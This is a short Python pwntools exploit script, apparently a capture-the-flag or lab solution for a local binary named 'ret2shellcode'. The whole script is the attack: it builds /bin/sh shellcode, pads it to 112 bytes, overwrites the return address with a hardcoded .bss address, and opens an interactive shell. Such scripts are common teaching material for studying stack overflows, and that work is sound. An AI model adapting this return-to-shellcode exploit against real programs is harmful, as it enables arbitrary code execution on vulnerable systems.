from pwn import*

sh = process("./ret2shellcode")
bss = 0x804A080
shellcode=asm(shellcraft.sh())
payload= shellcode.ljust(112,b'a')+ p32(bss)
sh.sendline(payload)
sh.interactive()
